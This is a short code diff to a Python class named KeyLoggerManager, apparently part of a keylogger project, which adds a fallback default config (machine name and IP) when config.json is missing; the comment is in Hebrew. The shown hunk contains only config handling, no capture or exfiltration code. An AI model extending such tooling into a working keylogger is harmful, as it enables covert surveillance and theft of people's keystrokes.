@@ -13,9 +13,15 @@ class KeyLoggerManager:
         self.config = self.load_config()
 
     def load_config(self):
-
-        with open("config.json", "r") as f:
-            return json.load(f)
+        try:
+            with open("config.json", "r") as f:
+                return json.load(f)
+        except FileNotFoundError:
+            # ברירת מחדל אם אין קובץ הגדרות
+            return {
+                "machine_name": "unknown",
+                "machine_ip": "127.0.0.1"
+            }
 
     def manager(self):
         new_keys = -1
